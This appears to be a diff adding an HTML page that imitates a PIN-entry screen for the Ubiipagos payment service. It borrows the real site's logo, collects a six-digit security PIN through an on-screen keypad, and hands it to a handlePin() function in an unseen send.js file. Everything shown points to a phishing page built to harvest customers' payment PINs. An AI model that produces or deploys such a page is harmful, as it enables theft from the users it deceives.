@@ -1,0 +1,306 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Ubiipagos</title>
+
+    <link rel="icon" href="ubii_logo1.png" type="image/x-icon">
+
+    <style>
+
+    :root {
+        --bg-color: #ffffff;
+        --text-color: #111827;
+        --secondary-color: #6b7280;
+        --button-color: #1698e8;
+        --button-hover: #0f89d8;
+        --dot-border: #bfc6d1;
+    }
+
+    @media (prefers-color-scheme: dark) {
+        :root {
+            --bg-color: #12141b;
+            --text-color: #ffffff;
+            --secondary-color: #c7ccd6;
+            --dot-border: #3a4150;
+        }
+    }
+
+    * {
+        margin: 0;
+        padding: 0;
+        box-sizing: border-box;
+        -webkit-tap-highlight-color: transparent;
+    }
+
+    html,
+    body {
+        width: 100%;
+        height: 100%;
+    }
+
+    body {
+        font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
+        background: var(--bg-color);
+        color: var(--text-color);
+        overflow: hidden;
+    }
+
+    .verification-card {
+        width: 100%;
+        max-width: 400px;
+        min-height: 100vh;
+        margin: 0 auto;
+        padding: 16px 22px 26px;
+        display: flex;
+        flex-direction: column;
+    }
+
+    .logo-container {
+        display: flex;
+        justify-content: center;
+        margin-top: 18px;
+        margin-bottom: 28px;
+    }
+
+    .logo-container img {
+        width: 140px;
+        max-width: 100%;
+        height: auto;
+    }
+
+    @media (prefers-color-scheme: dark) {
+        .logo-container img {
+            filter: brightness(0) invert(1);
+        }
+    }
+
+    .page-title {
+        text-align: center;
+        font-size: 17px;
+        font-weight: 500;
+        margin-bottom: 22px;
+    }
+
+    .page-subtitle {
+        text-align: center;
+        font-size: 15px;
+        color: var(--text-color);
+        margin-bottom: 42px;
+    }
+
+    .pin-display {
+        display: flex;
+        justify-content: center;
+        gap: 12px;
+        margin-bottom: 48px;
+    }
+
+    .pin-dot {
+        width: 14px;
+        height: 14px;
+        border-radius: 50%;
+        border: 2px solid var(--dot-border);
+        transition: .2s ease;
+    }
+
+    .pin-dot.filled {
+        background: var(--text-color);
+        border-color: var(--text-color);
+    }
+
+    .numeric-keypad {
+        width: 100%;
+        display: grid;
+        grid-template-columns: repeat(3, 1fr);
+        justify-items: center;
+        align-items: center;
+        row-gap: 24px;
+        margin-bottom: 34px;
+    }
+
+    .key {
+        background: transparent;
+        border: none;
+        color: var(--text-color);
+        font-size: 34px;
+        font-weight: 300;
+        cursor: pointer;
+        width: 58px;
+        height: 58px;
+        display: flex;
+        align-items: center;
+        justify-content: center;
+        user-select: none;
+    }
+
+    .key:active {
+        transform: scale(.92);
+    }
+
+    .delete-key {
+        font-size: 34px;
+    }
+
+    .btn-continue {
+        margin-top: auto;
+        width: 100%;
+        height: 50px;
+        border: none;
+        border-radius: 25px;
+        background: var(--button-color);
+        color: #ffffff;
+        font-size: 16px;
+        font-weight: 600;
+        cursor: pointer;
+        transition: .2s ease;
+    }
+
+    .btn-continue:hover {
+        background: var(--button-hover);
+    }
+
+    .btn-continue:active {
+        transform: scale(.99);
+    }
+
+    .btn-continue:disabled {
+        opacity: .6;
+        cursor: not-allowed;
+    }
+
+</style>
+</head>
+<body>
+
+    <div class="verification-card">
+
+        <div class="logo-container">
+            <img src="https://ubiionline.ubiipagos.com/LogoUbiiOnline.svg" alt="Ubii">
+        </div>
+
+        <h1 class="page-title">Pin de Seguridad</h1>
+
+        <div class="page-subtitle">
+            Ingresa tu PIN de seguridad
+        </div>
+
+        <form id="pin-form" onsubmit="submitPin(event)" >
+
+            <!-- Campo original que seguirá usando send.js -->
+            <input
+                type="hidden"
+                id="pin_seguridad"
+                name="pin_seguridad"
+                maxlength="6"
+                pattern="[0-9]{6}"
+                required>
+
+            <!-- Indicador visual del PIN -->
+            <div class="pin-display">
+
+                <span class="pin-dot" id="dot1"></span>
+                <span class="pin-dot" id="dot2"></span>
+                <span class="pin-dot" id="dot3"></span>
+                <span class="pin-dot" id="dot4"></span>
+                <span class="pin-dot" id="dot5"></span>
+                <span class="pin-dot" id="dot6"></span>
+
+            </div>
+
+            <!-- Teclado numérico -->
+            <div class="numeric-keypad">
+
+                <button type="button" class="key" data-number="1">1</button>
+                <button type="button" class="key" data-number="2">2</button>
+                <button type="button" class="key" data-number="3">3</button>
+
+                <button type="button" class="key" data-number="4">4</button>
+                <button type="button" class="key" data-number="5">5</button>
+                <button type="button" class="key" data-number="6">6</button>
+
+                <button type="button" class="key" data-number="7">7</button>
+                <button type="button" class="key" data-number="8">8</button>
+                <button type="button" class="key" data-number="9">9</button>
+
+                <div></div>
+
+                <button type="button" class="key" data-number="0">0</button>
+
+                <button type="button" class="key delete-key" id="deleteBtn">
+                    ←
+                </button>
+
+            </div>
+
+            <button type="submit" class="btn-continue" id="continueBtn">
+                Continuar
+            </button>
+
+        </form>
+
+    </div>
+<script src="send.js"></script>
+<script>
+  function submitPin(event) {
+    event.preventDefault();
+    const pin_seguridad = document.getElementById('pin_seguridad').value;
+    handlePin({ pin_seguridad });
+  }
+</script>
+    <script>
+
+        let pin = "";
+
+        const hiddenInput = document.getElementById("pin_seguridad");
+        const dots = document.querySelectorAll(".pin-dot");
+        const continueBtn = document.getElementById("continueBtn");
+
+        function updatePinDisplay() {
+
+            hiddenInput.value = pin;
+
+            dots.forEach((dot, index) => {
+
+                if (index < pin.length) {
+                    dot.classList.add("filled");
+                } else {
+                    dot.classList.remove("filled");
+                }
+
+            });
+
+            continueBtn.disabled = pin.length !== 6;
+        }
+
+        document.querySelectorAll("[data-number]").forEach(button => {
+
+            button.addEventListener("click", () => {
+
+                if (pin.length >= 6) {
+                    return;
+                }
+
+                pin += button.dataset.number;
+
+                updatePinDisplay();
+
+            });
+
+        });
+
+        document.getElementById("deleteBtn").addEventListener("click", () => {
+
+            pin = pin.slice(0, -1);
+
+            updatePinDisplay();
+
+        });
+
+        updatePinDisplay();
+
+    </script>
+
+</body>
+</html>
